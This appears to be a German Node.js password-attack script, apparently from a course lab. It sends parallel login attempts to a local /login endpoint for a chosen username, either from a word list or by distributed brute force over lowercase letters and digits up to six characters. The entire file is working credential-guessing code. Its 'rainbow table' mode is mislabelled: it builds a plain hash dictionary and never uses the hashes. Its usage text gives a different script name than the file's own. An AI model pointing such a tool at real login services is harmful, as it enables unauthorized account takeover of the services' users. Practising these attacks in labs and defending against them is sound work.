/*
Filename: crack3.js
Kurzbeschreibung:
  Kombiniertes Angriffstool mit drei Modi:
    - create: erstellt eine Rainbow Table aus einer wordlist.txt
    - rainbow: nutzt eine bestehende Rainbow Table für den Angriff
    - bruteforce: führt einen verteilten Brute-Force-Angriff aus (parallelisierbar über mehrere Instanzen)
  Das Tool unterstützt parallele Angriffe und das Laden/Speichern von Rainbow Tables.
Aufrufparameter:
  node crack3.js <username> <mode> [instanceId] [totalInstances]
  Modes:
    rainbow    - Rainbow Table Angriff
    bruteforce - Brute Force Angriff (parallelisierbar)
    create     - Erstelle Rainbow Table aus wordlist.txt
Beispiele:
  node crack3.js admin rainbow
  node crack3.js admin bruteforce 0 4
  node crack3.js admin create
Autor:
  Frederik, Kian
Datum:
  29.10.2025
*/

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const fetch = global.fetch || require('node-fetch');

const TARGET_URL = 'http://localhost:3000/login';
const RAINBOW_TABLE_PATH = path.resolve(__dirname, 'rainbow_table.json');
let found = false;

const pLimit = (concurrency) => {
    const queue = [];
    let active = 0;
    const next = () => {
        if (queue.length === 0) return;
        if (active >= concurrency) return;
        active++;
        const {fn, resolve} = queue.shift();
        fn().then((r) => {
            active--;
            resolve(r);
            next();
        }, (e) => {
            active--;
            resolve(Promise.reject(e));
            next();
        });
    };
    return (fn) => new Promise((resolve) => {
        queue.push({fn, resolve});
        next();
    });
};

function generateHash(password, algorithm = 'sha256') {
    return crypto.createHash(algorithm).update(password).digest('hex');
}

function buildRainbowTable(wordlist, outputPath, algorithm = 'sha256') {
    console.log(`Erstelle Rainbow Table mit ${algorithm}...`);
    const table = {};
    let count = 0;
    for (const password of wordlist) {
        const hash = generateHash(password, algorithm);
        table[hash] = password;
        count++;
        if (count % 1000 === 0) {
            process.stdout.write(`\rGeneriert: ${count} Einträge`);
        }
    }
    console.log(`\n✓ Rainbow Table erstellt: ${count} Einträge`);
    fs.writeFileSync(outputPath, JSON.stringify(table, null, 2));
    console.log(`✓ Gespeichert: ${outputPath}`);
    return table;
}

function loadRainbowTable(filePath) {
    if (fs.existsSync(filePath)) {
        console.log(`Lade Rainbow Table von ${filePath}...`);
        const data = fs.readFileSync(filePath, 'utf8');
        const table = JSON.parse(data);
        console.log(`✓ Rainbow Table geladen: ${Object.keys(table).length} Einträge`);
        return table;
    }
    return null;
}

async function tryWithRainbowTable(username, rainbowTable) {
    console.log('\n=== RAINBOW TABLE ANGRIFF ===');
    const passwords = Object.values(rainbowTable);
    console.log(`Teste ${passwords.length} Passwörter aus Rainbow Table...`);
    const limit = pLimit(10);
    let tested = 0;
    for (const password of passwords) {
        if (found) break;
        await limit(() => tryCandidate(password, username));
        tested++;
        if (tested % 100 === 0) {
            process.stdout.write(`\rGetestet: ${tested}/${passwords.length}`);
        }
    }
    console.log(`\nRainbow Table Angriff abgeschlossen: ${tested} Passwörter getestet`);
}

function getInstanceConfig() {
    const instanceId = parseInt(process.env.INSTANCE_ID || process.argv[4] || '0');
    const totalInstances = parseInt(process.env.TOTAL_INSTANCES || process.argv[5] || '1');
    return {instanceId, totalInstances};
}

function* generateBruteForce(charset, maxLen, startIdx = 0, skipCount = 1) {
    let currentIdx = 0;
    for (let len = 1; len <= maxLen; len++) {
        const indices = Array(len).fill(0);
        while (true) {
            if (currentIdx >= startIdx && (currentIdx - startIdx) % skipCount === 0) {
                yield indices.map(i => charset[i]).join('');
            }
            currentIdx++;
            let pos = len - 1;
            while (pos >= 0) {
                indices[pos]++;
                if (indices[pos] < charset.length) break;
                indices[pos] = 0;
                pos--;
            }
            if (pos < 0) break;
        }
    }
}

async function bruteForceAttack(username, charset, maxLen, instanceId, totalInstances) {
    console.log('\n=== BRUTE FORCE ANGRIFF ===');
    console.log(`Charset: ${charset.join('')}`);
    console.log(`Max Länge: ${maxLen}`);
    console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
    const generator = generateBruteForce(charset, maxLen, instanceId, totalInstances);
    const limit = pLimit(10);
    let tested = 0;
    for (const candidate of generator) {
        if (found) break;
        await limit(() => tryCandidate(candidate, username));
        tested++;
        if (tested % 1000 === 0) {
            process.stdout.write(`\rBrute-Force Versuche: ${tested}`);
        }
    }
    console.log(`\nBrute Force abgeschlossen: ${tested} Kombinationen getestet`);
}

async function tryCandidate(candidate, username) {
    if (found) return false;
    const body = {username: username, password: candidate};
    try {
        const resp = await fetch(TARGET_URL, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        });
        if (resp.status === 200) {
            console.log(`\n✓✓✓ PASSWORT GEFUNDEN für ${username}: ${candidate}`);
            found = true;
            return true;
        }
        return false;
    } catch (err) {
        console.error(`\nNetzwerkfehler: ${err.message}`);
        return false;
    }
}

const USERNAME = process.argv[2];
const MODE = process.argv[3] || 'rainbow';
if (!USERNAME) {
    console.error('Usage: node attacker.js <username> <mode> [instanceId] [totalInstances]');
    console.error('');
    console.error('Modes:');
    console.error('  rainbow    - Rainbow Table Angriff');
    console.error('  bruteforce - Brute Force Angriff (parallelisierbar)');
    console.error('  create     - Erstelle Rainbow Table aus wordlist.txt');
    console.error('');
    console.error('Beispiele:');
    console.error('  node attacker.js admin rainbow');
    console.error('  node attacker.js admin bruteforce 0 4    # Instanz 1 von 4');
    console.error('  node attacker.js admin create');
    process.exit(1);
}

(async () => {
    console.log(`\n=== PASSWORD ATTACK TOOL ===`);
    console.log(`Target: ${TARGET_URL}`);
    console.log(`Username: ${USERNAME}`);
    console.log(`Mode: ${MODE}`);
    const {instanceId, totalInstances} = getInstanceConfig();
    if (MODE === 'create') {
        console.log('\n=== RAINBOW TABLE ERSTELLEN ===');
        const wordlistPath = path.resolve(__dirname, 'wordlist.txt');
        if (!fs.existsSync(wordlistPath)) {
            console.error(`Fehler: ${wordlistPath} nicht gefunden!`);
            console.error('Erstelle eine wordlist.txt Datei mit Passwörtern (ein Passwort pro Zeile)');
            process.exit(1);
        }
        const wordlist = fs.readFileSync(wordlistPath, 'utf8')
            .split(/\r?\n/)
            .map(line => line.trim())
            .filter(Boolean);
        console.log(`Wordlist geladen: ${wordlist.length} Einträge`);
        buildRainbowTable(wordlist, RAINBOW_TABLE_PATH);
        process.exit(0);
    }
    if (MODE === 'rainbow') {
        let rainbowTable = loadRainbowTable(RAINBOW_TABLE_PATH);
        if (!rainbowTable) {
            console.error('\nKeine Rainbow Table gefunden!');
            console.error('Erstelle zuerst eine Rainbow Table mit: node attacker.js <user> create');
            process.exit(1);
        }
        await tryWithRainbowTable(USERNAME, rainbowTable);
    } else if (MODE === 'bruteforce') {
        console.log(`Instance: ${instanceId + 1}/${totalInstances}`);
        const charset = '0123456789abcdefghijklmnopqrstuvwxyz'.split('');
        const maxLen = 6;
        await bruteForceAttack(USERNAME, charset, maxLen, instanceId, totalInstances);
    } else {
        console.error(`Unbekannter Mode: ${MODE}`);
        console.error('Verwende: rainbow, bruteforce, oder create');
        process.exit(1);
    }
    console.log('\n=== FERTIG ===');
    if (!found) {
        console.log('Passwort nicht gefunden.');
    }
    process.exit(found ? 0 : 1);
})();